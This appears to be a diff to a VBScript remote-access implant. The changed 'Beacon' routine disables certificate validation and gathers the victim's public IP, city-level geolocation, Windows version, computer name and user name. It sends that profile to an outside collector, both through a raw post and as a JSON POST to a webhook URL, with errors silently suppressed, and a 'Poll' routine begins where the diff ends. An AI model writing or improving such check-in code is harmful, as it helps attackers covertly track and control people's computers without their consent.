@@ -57,24 +57,33 @@ End Function
 
 Sub Beacon()
     On Error Resume Next
-    Dim ip, geo, osver, xh, ll
+    Dim ip, geo, osver, xh, ll, msg
     Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
     xh.Open "GET", "https://api.ipify.org/", False
     xh.Send
-    If xh.Status = 200 Then ip = xh.responseText Else ip = "unknown"
+    If xh.Status = 200 Then ip = Trim(xh.responseText) Else ip = "unknown"
     geo = "unknown"
     If Len(ip) > 6 Then
-        xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False
+        xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city", False
         xh.Send
         If xh.Status = 200 Then
-            ll = Split(xh.responseText, vbLf)
-            If UBound(ll) >= 3 Then geo = ll(0) & ", " & ll(2) & " (" & ll(3) & ")"
+            ll = Split(Replace(xh.responseText, vbCr, ""), vbLf)
+            If UBound(ll) >= 2 Then geo = ll(0) & " / " & ll(2)
         End If
     End If
-    osver = sh.RegRead("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName") & " " & sh.RegRead("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\DisplayVersion")
+    osver = "Win"
+    On Error Resume Next
+    osver = sh.RegRead("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName")
+    msg = "NEW|" & uuid & "|" & PC & "|" & USER & "|" & ip & "|" & osver & "|" & geo
+    PostRaw msg
+    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    h.SetOption 2, 13056
+    h.Open "POST", WH, False
+    h.SetRequestHeader "Content-Type", "application/json"
+    h.Send "{""content"":""" & Replace(msg, """", "'") & """}"
+    Set h = Nothing
     Set xh = Nothing
-    PostRaw "NEW|" & uuid & "|" & PC & "|" & USER & "|" & ip & "|" & osver & "|" & geo
 End Sub
 Sub Poll()
     On Error Resume Next
